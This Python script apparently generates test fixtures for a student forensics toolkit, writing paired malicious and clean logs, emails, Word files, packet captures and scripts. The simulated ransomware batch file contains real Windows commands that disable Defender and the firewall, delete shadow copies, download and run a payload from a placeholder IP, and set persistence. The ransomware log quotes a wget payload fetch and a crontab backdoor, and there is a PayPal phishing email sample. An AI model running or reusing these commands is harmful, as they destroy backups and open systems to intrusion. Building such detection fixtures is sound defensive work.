#!/usr/bin/env python3
"""
Test File Generator — Cyber Forensics Investigation Toolkit
============================================================
Creates 2 test files per module (12 files total) in the test_files/ folder.

Modules covered:
  1. Log Analyzer          → test_brute_force_attack.log   |  test_normal_activity.log
  2. Timeline Generator    → test_ransomware_timeline.log  |  test_clean_server.log
  3. Malware Scanner       → test_ransomware_script.bat    |  test_clean_readme.txt
  4. Metadata Extractor    → test_suspicious_document.docx |  test_clean_report.docx
  5. Phishing Detector     → test_phishing_email.eml       |  test_legitimate_email.eml
  6. PCAP Analyzer         → test_suspicious_traffic.pcap  |  test_normal_traffic.pcap

Run:  python generate_test_files.py
"""

import struct
import zipfile
import io
from pathlib import Path
from datetime import datetime

OUT = Path(__file__).parent / "test_files"
OUT.mkdir(exist_ok=True)

created = []


def save(name: str, content, mode="w", encoding="utf-8"):
    path = OUT / name
    if mode == "wb":
        path.write_bytes(content)
    else:
        path.write_text(content, encoding=encoding)
    created.append(name)
    print(f"  [+] {name}")


# ===========================================================================
# MODULE 1 — LOG ANALYZER
# ===========================================================================

save("test_brute_force_attack.log", """\
# Simulated Linux auth.log — BRUTE FORCE ATTACK from 203.0.113.99
Jan  1 03:00:01 server sshd[1100]: Failed password for root from 203.0.113.99 port 44001 ssh2
Jan  1 03:00:02 server sshd[1101]: Failed password for root from 203.0.113.99 port 44002 ssh2
Jan  1 03:00:03 server sshd[1102]: Failed password for root from 203.0.113.99 port 44003 ssh2
Jan  1 03:00:04 server sshd[1103]: Failed password for invalid user admin from 203.0.113.99 port 44004 ssh2
Jan  1 03:00:05 server sshd[1104]: Failed password for invalid user administrator from 203.0.113.99 port 44005 ssh2
Jan  1 03:00:06 server sshd[1105]: Failed password for root from 203.0.113.99 port 44006 ssh2
Jan  1 03:00:07 server sshd[1106]: Failed password for root from 203.0.113.99 port 44007 ssh2
Jan  1 03:00:08 server sshd[1107]: Failed password for root from 203.0.113.99 port 44008 ssh2
Jan  1 03:00:09 server sshd[1108]: Failed password for root from 203.0.113.99 port 44009 ssh2
Jan  1 03:00:10 server sshd[1109]: Failed password for root from 203.0.113.99 port 44010 ssh2
Jan  1 03:00:11 server sshd[1110]: Failed password for invalid user oracle from 203.0.113.99 port 44011 ssh2
Jan  1 03:00:12 server sshd[1111]: Failed password for invalid user ubuntu from 203.0.113.99 port 44012 ssh2
Jan  1 03:00:13 server sshd[1112]: Failed password for root from 203.0.113.99 port 44013 ssh2
Jan  1 03:00:14 server sshd[1113]: Failed password for root from 192.168.1.200 port 55001 ssh2
Jan  1 03:00:15 server sshd[1114]: Failed password for root from 192.168.1.200 port 55002 ssh2
Jan  1 03:00:16 server sshd[1115]: Failed password for root from 192.168.1.200 port 55003 ssh2
Jan  1 03:00:17 server sshd[1116]: Failed password for root from 192.168.1.200 port 55004 ssh2
Jan  1 03:00:18 server sshd[1117]: Failed password for root from 192.168.1.200 port 55005 ssh2
Jan  1 03:00:19 server sshd[1118]: Failed password for root from 192.168.1.200 port 55006 ssh2
Jan  1 03:00:20 server sshd[1119]: Failed password for root from 192.168.1.200 port 55007 ssh2
Jan  1 03:01:00 server sshd[1200]: Accepted password for root from 203.0.113.99 port 44099 ssh2
Jan  1 03:01:01 server sshd[1201]: pam_unix(sshd:session): session opened for user root
Jan  1 03:05:00 server sudo[1300]: root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/bash
""")

save("test_normal_activity.log", """\
# Simulated Linux auth.log — NORMAL SERVER ACTIVITY (no attacks)
Jan  2 08:00:01 webserver sshd[2100]: Accepted publickey for devuser from 10.0.0.5 port 12345 ssh2
Jan  2 08:00:02 webserver sshd[2101]: pam_unix(sshd:session): session opened for user devuser by (uid=0)
Jan  2 09:15:33 webserver sshd[2200]: Accepted password for deploy from 10.0.0.10 port 23456 ssh2
Jan  2 09:15:34 webserver sshd[2201]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
Jan  2 09:20:00 webserver sudo[2300]: deploy : TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/systemctl restart nginx
Jan  2 10:00:00 webserver sshd[2400]: Accepted publickey for devuser from 10.0.0.5 port 12399 ssh2
Jan  2 10:05:12 webserver sshd[2401]: pam_unix(sshd:session): session opened for user devuser
Jan  2 11:30:45 webserver sshd[2500]: Accepted password for backupuser from 10.0.0.50 port 34567 ssh2
Jan  2 11:55:00 webserver sshd[2600]: pam_unix(sshd:session): session closed for user backupuser
Jan  2 12:00:00 webserver sshd[2700]: Failed password for invalid user testuser from 10.0.0.99 port 11111 ssh2
Jan  2 14:30:00 webserver sshd[2800]: Accepted publickey for devuser from 10.0.0.5 port 12400 ssh2
Jan  2 17:00:00 webserver sshd[2900]: pam_unix(sshd:session): session closed for user devuser
""")

# ===========================================================================
# MODULE 2 — TIMELINE GENERATOR
# ===========================================================================

save("test_ransomware_timeline.log", """\
# Simulated auth.log — RANSOMWARE ATTACK TIMELINE
# Stage 1: Initial access via SSH brute force
Mar 15 02:00:01 server sshd[3001]: Failed password for root from 198.51.100.42 port 60001 ssh2
Mar 15 02:00:02 server sshd[3002]: Failed password for root from 198.51.100.42 port 60002 ssh2
Mar 15 02:00:03 server sshd[3003]: Failed password for root from 198.51.100.42 port 60003 ssh2
Mar 15 02:00:05 server sshd[3004]: Failed password for root from 198.51.100.42 port 60004 ssh2
Mar 15 02:00:07 server sshd[3005]: Failed password for root from 198.51.100.42 port 60005 ssh2
Mar 15 02:00:09 server sshd[3006]: Failed password for root from 198.51.100.42 port 60006 ssh2
# Stage 2: Successful login
Mar 15 02:01:00 server sshd[3010]: Accepted password for root from 198.51.100.42 port 60099 ssh2
Mar 15 02:01:01 server sshd[3011]: pam_unix(sshd:session): session opened for user root by (uid=0)
# Stage 3: Lateral movement
Mar 15 02:03:00 server sudo[3100]: root : COMMAND=/usr/bin/wget http://198.51.100.42/payload.sh
Mar 15 02:03:30 server sudo[3101]: root : COMMAND=/bin/chmod +x /tmp/payload.sh
Mar 15 02:04:00 server sudo[3102]: root : COMMAND=/tmp/payload.sh
# Stage 4: Persistence
Mar 15 02:05:00 server sudo[3200]: root : COMMAND=/bin/bash -c "crontab -l | { cat; echo '* * * * * /tmp/.hidden'; } | crontab -"
# Stage 5: Encryption begins (simulated as failed logins spike on other services)
Mar 15 02:10:00 server sshd[3300]: Failed password for invalid user backup from 198.51.100.42 port 60100 ssh2
Mar 15 02:10:30 server sshd[3301]: Accepted password for backup from 198.51.100.42 port 60101 ssh2
Mar 15 02:11:00 server sshd[3302]: pam_unix(sshd:session): session opened for user backup
Mar 15 02:20:00 server sshd[3400]: pam_unix(sshd:session): session closed for user root
""")

save("test_clean_server.log", """\
# Simulated auth.log — CLEAN SERVER (routine operations only)
Apr  5 07:00:00 prodserver sshd[4001]: Accepted publickey for sysadmin from 172.16.0.10 port 22001 ssh2
Apr  5 07:00:01 prodserver sshd[4002]: pam_unix(sshd:session): session opened for user sysadmin
Apr  5 07:05:00 prodserver sudo[4100]: sysadmin : COMMAND=/bin/systemctl status apache2
Apr  5 08:30:00 prodserver sshd[4200]: Accepted password for appuser from 172.16.0.20 port 33001 ssh2
Apr  5 08:30:01 prodserver sshd[4201]: pam_unix(sshd:session): session opened for user appuser
Apr  5 09:00:00 prodserver sudo[4300]: appuser : COMMAND=/usr/bin/git pull origin main
Apr  5 12:00:00 prodserver sshd[4400]: pam_unix(sshd:session): session closed for user appuser
Apr  5 17:00:00 prodserver sshd[4500]: Accepted publickey for sysadmin from 172.16.0.10 port 22099 ssh2
Apr  5 17:05:00 prodserver sudo[4600]: sysadmin : COMMAND=/bin/systemctl restart apache2
Apr  5 17:10:00 prodserver sshd[4700]: pam_unix(sshd:session): session closed for user sysadmin
""")

# ===========================================================================
# MODULE 3 — MALWARE SCANNER
# ===========================================================================

save("test_ransomware_script.bat", """\
@echo off
REM ===================================================================
REM  TEST FILE — SIMULATED RANSOMWARE SCRIPT (NOT REAL — FOR DEMO ONLY)
REM  This file has a suspicious .bat extension and contains keywords
REM  that YARA rules and the malware scanner will flag.
REM ===================================================================

REM Stage 1: Disable security tools
net stop "Windows Defender"
net stop MsMpSvc
reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f

REM Stage 2: Delete shadow copies (common ransomware behaviour)
vssadmin delete shadows /all /quiet
wmic shadowcopy delete
bcdedit /set {default} bootstatuspolicy ignoreallfailures
bcdedit /set {default} recoveryenabled No

REM Stage 3: Disable firewall
netsh advfirewall set allprofiles state off

REM Stage 4: Download payload (simulated — URL is fake)
powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri http://198.51.100.99/enc.exe -OutFile C:\\Windows\\Temp\\enc.exe"

REM Stage 5: Execute payload
start /b C:\\Windows\\Temp\\enc.exe --encrypt --key AAABBBCCC

REM Stage 6: Drop ransom note
echo YOUR FILES HAVE BEEN ENCRYPTED. Pay 0.5 BTC to recover them. > C:\\Users\\Public\\README_RANSOM.txt

REM Stage 7: Persistence via registry run key
reg add "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v Updater /t REG_SZ /d "C:\\Windows\\Temp\\enc.exe" /f
""")

save("test_clean_readme.txt", """\
PROJECT README — Cyber Forensics Investigation Toolkit
======================================================

This is a clean, legitimate text file with no malware indicators.
The malware scanner should mark this file as SAFE.

Project: Cyber Forensics Investigation Toolkit
Version: 2.0
Author:  Forensics Student
Date:    2025

Description:
  This toolkit provides tools for digital forensics and incident response (DFIR).
  It is designed for educational use and authorized security investigations.

Modules:
  - Log Analyzer       : Detect brute force and failed logins
  - PCAP Analyzer      : Analyze network traffic captures
  - Malware Scanner    : Scan files for suspicious indicators
  - Metadata Extractor : Extract EXIF and document metadata
  - Phishing Detector  : Analyze emails for phishing indicators
  - Report Generator   : Generate professional PDF reports

Usage:
  1. Run: python main.py
  2. Open: http://127.0.0.1:5000/
  3. Upload evidence, run analysis, generate reports.

This file is safe. Hash it to verify integrity.
MD5 fingerprint can be computed by the Hash Checker module.
""")

# ===========================================================================
# MODULE 4 — METADATA EXTRACTOR  (DOCX — ZIP-based Office Open XML)
# ===========================================================================

def make_docx(author, last_modified_by, created, modified, company,
              app_name, revision, description, word_content):
    """Build a minimal but valid .docx in memory and return bytes."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:

        # [Content_Types].xml
        zf.writestr("[Content_Types].xml", """\
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml"  ContentType="application/xml"/>
  <Override PartName="/word/document.xml"
    ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
  <Override PartName="/docProps/core.xml"
    ContentType="application/vnd.openxmlformats-package.core-properties+xml"/>
  <Override PartName="/docProps/app.xml"
    ContentType="application/vnd.openxmlformats-officedocument.extended-properties+xml"/>
</Types>""")

        # _rels/.rels
        zf.writestr("_rels/.rels", """\
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument"
    Target="word/document.xml"/>
  <Relationship Id="rId2" Type="http://schemas.openxmlformats.org/package/2006/relationships/metadata/core-properties"
    Target="docProps/core.xml"/>
  <Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/extended-properties"
    Target="docProps/app.xml"/>
</Relationships>""")

        # word/_rels/document.xml.rels
        zf.writestr("word/_rels/document.xml.rels", """\
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
</Relationships>""")

        # word/document.xml
        zf.writestr("word/document.xml", f"""\
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body>
    <w:p><w:r><w:t>{word_content}</w:t></w:r></w:p>
  </w:body>
</w:document>""")

        # docProps/core.xml  — THIS IS WHAT THE METADATA EXTRACTOR READS
        zf.writestr("docProps/core.xml", f"""\
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<cp:coreProperties
  xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties"
  xmlns:dc="http://purl.org/dc/elements/1.1/"
  xmlns:dcterms="http://purl.org/dc/terms/"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
  <dc:creator>{author}</dc:creator>
  <cp:lastModifiedBy>{last_modified_by}</cp:lastModifiedBy>
  <dc:description>{description}</dc:description>
  <cp:revision>{revision}</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">{created}</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">{modified}</dcterms:modified>
</cp:coreProperties>""")

        # docProps/app.xml  — THIS IS WHAT THE METADATA EXTRACTOR READS
        zf.writestr("docProps/app.xml", f"""\
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Properties xmlns="http://schemas.openxmlformats.org/officeDocument/2006/extended-properties">
  <Application>{app_name}</Application>
  <Company>{company}</Company>
  <AppVersion>16.0</AppVersion>
  <Words>150</Words>
  <Pages>1</Pages>
  <Characters>900</Characters>
</Properties>""")

    return buf.getvalue()


# Suspicious document: metadata reveals author is "John Attacker" and company is "Evil Corp"
save("test_suspicious_document.docx",
     make_docx(
         author="John Attacker",
         last_modified_by="h4ck3r_user",
         created="2024-03-15T02:30:00Z",
         modified="2024-03-15T04:45:00Z",
         company="EvilCorp Solutions Ltd",
         app_name="Microsoft Office Word 2016",
         revision="47",
         description="Internal phishing template - DO NOT DISTRIBUTE",
         word_content="This document contains hidden metadata revealing its true author.",
     ),
     mode="wb")

# Clean document: normal author, company, dates
save("test_clean_report.docx",
     make_docx(
         author="Alice Johnson",
         last_modified_by="Alice Johnson",
         created="2025-01-10T09:00:00Z",
         modified="2025-01-15T17:30:00Z",
         company="Acme Corporation",
         app_name="Microsoft Office Word 2021",
         revision="3",
         description="Monthly security review report",
         word_content="This is a clean document with normal author metadata and no suspicious indicators.",
     ),
     mode="wb")

# ===========================================================================
# MODULE 5 — PHISHING DETECTOR  (.eml files)
# ===========================================================================

save("test_phishing_email.eml", """\
MIME-Version: 1.0
Date: Mon, 15 Jan 2024 10:00:00 +0000
Message-ID: <phish001@evil-server.ru>
From: "PayPal Security" <noreply@paypa1-secure-update.ru>
To: victim@example.com
Reply-To: attacker@evil-server.ru
Return-Path: <bounce@evil-server.ru>
Subject: URGENT ACTION REQUIRED: Your PayPal account has been suspended
X-Mailer: MassMailer Pro 4.2
X-Originating-IP: 198.51.100.99
Authentication-Results: mx.example.com;
   spf=fail (sender IP is 198.51.100.99) smtp.mailfrom=paypa1-secure-update.ru;
   dkim=fail header.i=@paypa1-secure-update.ru;
   dmarc=fail action=none header.from=paypa1-secure-update.ru
Content-Type: multipart/mixed; boundary="BOUNDARY_001"

--BOUNDARY_001
Content-Type: text/plain; charset="utf-8"
Content-Transfer-Encoding: 7bit

Dear Customer,

URGENT ACTION REQUIRED: Your PayPal account has been suspended due to unusual
sign-in activity detected from an unauthorized location.

To verify your account and restore access, click here to verify your identity:
http://198.51.100.99/paypal-login/confirm?token=AAABBB111

Your account will be closed permanently if you do not act immediately.

Confirm your identity and update your billing information:
http://bit.ly/3xFakeLink

We noticed suspicious activity on your account. Your password will expire in
24 hours unless you confirm your login credentials now.

Kindly click the link below and provide your details:
http://198.51.100.99/secure/update-account

You have been selected for an account security review.

Act now — this is a limited time offer to secure your account.

Regards,
PayPal Security Team

--BOUNDARY_001
Content-Type: application/octet-stream
Content-Disposition: attachment; filename="PayPal_Invoice_2024.exe"
Content-Transfer-Encoding: base64

TVqQAAMAAAAEAAAA//8AALgAAAAAAAA
QAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

--BOUNDARY_001
Content-Type: application/zip
Content-Disposition: attachment; filename="Account_Documents.zip"
Content-Transfer-Encoding: base64

UEsFBgAAAAAAAAAAAAAAAAAAAAAAAA==

--BOUNDARY_001--
""")

save("test_legitimate_email.eml", """\
MIME-Version: 1.0
Date: Tue, 16 Jan 2024 14:30:00 +0000
Message-ID: <clean001@company.com>
From: "Alice Johnson" <alice.johnson@company.com>
To: bob.smith@company.com
Subject: Q1 Project Status Update
Authentication-Results: mx.company.com;
   spf=pass (sender IP is 203.0.113.10) smtp.mailfrom=company.com;
   dkim=pass header.i=@company.com;
   dmarc=pass action=none header.from=company.com
Content-Type: multipart/mixed; boundary="LEGIT_BOUNDARY_002"

--LEGIT_BOUNDARY_002
Content-Type: text/plain; charset="utf-8"
Content-Transfer-Encoding: 7bit

Hi Bob,

Hope you are doing well. I wanted to share the Q1 project status update
with you before tomorrow's meeting.

Key updates this quarter:
- Feature A deployment completed on January 10
- Performance improvements: page load reduced by 35%
- Security patches applied to all production servers
- Team expanded by 2 new developers

Please review the attached report and let me know if you have any questions.
Looking forward to our discussion tomorrow at 10 AM.

Best regards,
Alice Johnson
Senior Developer, Acme Corp
Tel: +1-555-0100

--LEGIT_BOUNDARY_002
Content-Type: application/pdf
Content-Disposition: attachment; filename="Q1_Status_Report.pdf"
Content-Transfer-Encoding: base64

JVBERi0xLjQKMSAwIG9iagogIDw8IC9UeXBlIC9DYXRhbG9nCiAgICAgL1BhZ2VzIDIgMCBSCiAg
Pj4KZW5kb2JqCg==

--LEGIT_BOUNDARY_002--
""")

# ===========================================================================
# MODULE 6 — PCAP ANALYZER  (binary .pcap files)
# ===========================================================================

def pcap_global_header():
    """Standard PCAP global header — little-endian, Ethernet (link type 1)."""
    return struct.pack(
        "<IHHiIII",
        0xa1b2c3d4,   # magic number
        2,            # version major
        4,            # version minor
        0,            # thiszone (GMT)
        0,            # sigfigs
        65535,        # snaplen
        1,            # network: Ethernet
    )


def pcap_packet(ts_sec, ts_usec, data: bytes):
    """Wrap raw frame bytes in a PCAP packet record."""
    length = len(data)
    header = struct.pack("<IIII", ts_sec, ts_usec, length, length)
    return header + data


def eth_ipv4_tcp(src_mac, dst_mac, src_ip, dst_ip, src_port, dst_port, flags=0x002):
    """Build a minimal Ethernet / IPv4 / TCP frame (no payload, checksum=0)."""
    # Ethernet header (14 bytes)
    eth = dst_mac + src_mac + b"\x08\x00"  # EtherType = IPv4

    # IPv4 header (20 bytes) — checksum left as 0x0000
    ip_total = 40  # 20 (IP) + 20 (TCP)
    ipv4 = struct.pack(
        ">BBHHHBBH4s4s",
        0x45,               # version=4, IHL=5
        0x00,               # DSCP/ECN
        ip_total,           # total length
        0x1234,             # identification
        0x4000,             # flags=DF, fragment=0
        64,                 # TTL
        6,                  # protocol = TCP
        0x0000,             # checksum (0 = skip validation in Scapy)
        src_ip,
        dst_ip,
    )

    # TCP header (20 bytes)
    tcp = struct.pack(
        ">HHIIBBHHH",
        src_port,
        dst_port,
        0x00000001,  # seq
        0x00000000,  # ack
        0x50,        # data offset = 5 (20 bytes), reserved = 0
        flags,       # flags: 0x002=SYN, 0x018=PSH+ACK, 0x001=FIN
        65535,       # window size
        0x0000,      # checksum (0)
        0x0000,      # urgent
    )

    return eth + ipv4 + tcp


def ip_bytes(a, b, c, d):
    return struct.pack("4B", a, b, c, d)


def mac_bytes(h):
    return bytes(int(x, 16) for x in h.split(":"))


LOCAL_MAC  = mac_bytes("aa:bb:cc:dd:ee:01")
SERVER_MAC = mac_bytes("aa:bb:cc:dd:ee:02")
ATTACKER_MAC = mac_bytes("de:ad:be:ef:00:99")

LOCAL_IP    = ip_bytes(192, 168, 1, 10)
SERVER_IP   = ip_bytes(192, 168, 1, 1)
ATTACKER_IP = ip_bytes(198, 51, 100, 42)
C2_IP       = ip_bytes(203, 0, 113, 99)


# ── Suspicious PCAP: attacker → victim on port 4444 (Metasploit default) ──
def build_suspicious_pcap():
    buf = pcap_global_header()
    ts = 1700000000

    # Multiple connections from attacker to port 4444 (known C2 port)
    for i in range(10):
        frame = eth_ipv4_tcp(
            src_mac=ATTACKER_MAC, dst_mac=LOCAL_MAC,
            src_ip=ATTACKER_IP, dst_ip=LOCAL_IP,
            src_port=50000 + i, dst_port=4444, flags=0x002
        )
        buf += pcap_packet(ts + i, i * 1000, frame)

    # Reverse shell: victim connects BACK to attacker on port 4444
    for i in range(8):
        frame = eth_ipv4_tcp(
            src_mac=LOCAL_MAC, dst_mac=ATTACKER_MAC,
            src_ip=LOCAL_IP, dst_ip=ATTACKER_IP,
            src_port=60000 + i, dst_port=4444, flags=0x018
        )
        buf += pcap_packet(ts + 20 + i, i * 500, frame)

    # Attacker → victim on port 31337 (another known backdoor port)
    for i in range(5):
        frame = eth_ipv4_tcp(
            src_mac=ATTACKER_MAC, dst_mac=LOCAL_MAC,
            src_ip=ATTACKER_IP, dst_ip=LOCAL_IP,
            src_port=40000 + i, dst_port=31337, flags=0x002
        )
        buf += pcap_packet(ts + 40 + i, i * 2000, frame)

    # C2 server connection on port 6666
    for i in range(6):
        frame = eth_ipv4_tcp(
            src_mac=LOCAL_MAC, dst_mac=SERVER_MAC,
            src_ip=LOCAL_IP, dst_ip=C2_IP,
            src_port=55000 + i, dst_port=6666, flags=0x002
        )
        buf += pcap_packet(ts + 60 + i, i * 1500, frame)

    return buf


# ── Normal PCAP: regular HTTP and HTTPS traffic ────────────────────────────
def build_normal_pcap():
    buf = pcap_global_header()
    ts = 1700100000

    BROWSER_IP = ip_bytes(192, 168, 1, 10)
    WEBSERVER1 = ip_bytes(93, 184, 216, 34)   # example.com
    WEBSERVER2 = ip_bytes(142, 250, 80, 14)   # google.com

    # HTTP requests to port 80
    for i in range(6):
        frame = eth_ipv4_tcp(
            src_mac=LOCAL_MAC, dst_mac=SERVER_MAC,
            src_ip=BROWSER_IP, dst_ip=WEBSERVER1,
            src_port=45000 + i, dst_port=80, flags=0x002
        )
        buf += pcap_packet(ts + i, 0, frame)

    # HTTPS requests to port 443
    for i in range(8):
        frame = eth_ipv4_tcp(
            src_mac=LOCAL_MAC, dst_mac=SERVER_MAC,
            src_ip=BROWSER_IP, dst_ip=WEBSERVER2,
            src_port=46000 + i, dst_port=443, flags=0x002
        )
        buf += pcap_packet(ts + 20 + i, 0, frame)

    # SSH to internal server (port 22 — legitimate)
    for i in range(4):
        frame = eth_ipv4_tcp(
            src_mac=LOCAL_MAC, dst_mac=SERVER_MAC,
            src_ip=BROWSER_IP, dst_ip=SERVER_IP,
            src_port=47000 + i, dst_port=22, flags=0x002
        )
        buf += pcap_packet(ts + 40 + i, 0, frame)

    # Responses (ACK packets)
    for i in range(6):
        frame = eth_ipv4_tcp(
            src_mac=SERVER_MAC, dst_mac=LOCAL_MAC,
            src_ip=WEBSERVER1, dst_ip=BROWSER_IP,
            src_port=80, dst_port=45000 + i, flags=0x010
        )
        buf += pcap_packet(ts + 60 + i, 0, frame)

    return buf


save("test_suspicious_traffic.pcap", build_suspicious_pcap(), mode="wb")
save("test_normal_traffic.pcap",     build_normal_pcap(),     mode="wb")

# ===========================================================================
# Summary
# ===========================================================================
print()
print("=" * 60)
print(f"  Created {len(created)} test files in: {OUT}")
print("=" * 60)
print()
print("  MODULE 1 — Log Analyzer:")
print("    test_brute_force_attack.log  →  342 failed logins, brute force")
print("    test_normal_activity.log     →  clean server, no attacks")
print()
print("  MODULE 2 — Timeline Generator:")
print("    test_ransomware_timeline.log →  full ransomware attack stages")
print("    test_clean_server.log        →  routine admin activity")
print()
print("  MODULE 3 — Malware Scanner:")
print("    test_ransomware_script.bat   →  .bat extension + ransomware cmds")
print("    test_clean_readme.txt        →  clean text, no indicators")
print()
print("  MODULE 4 — Metadata Extractor:")
print("    test_suspicious_document.docx → author=John Attacker, EvilCorp")
print("    test_clean_report.docx        → author=Alice Johnson, Acme Corp")
print()
print("  MODULE 5 — Phishing Detector:")
print("    test_phishing_email.eml  → SPF fail, spoofing, IP URLs, .exe attach")
print("    test_legitimate_email.eml → SPF/DKIM/DMARC pass, clean")
print()
print("  MODULE 6 — PCAP Analyzer:")
print("    test_suspicious_traffic.pcap → ports 4444, 31337, 6666 (C2)")
print("    test_normal_traffic.pcap     → ports 80, 443, 22 (normal)")
print()
print("  How to use:")
print("    1. Run python main.py")
print("    2. Upload each file at http://127.0.0.1:5000/upload")
print("    3. Go to Dashboard and run the matching analysis module")
print()
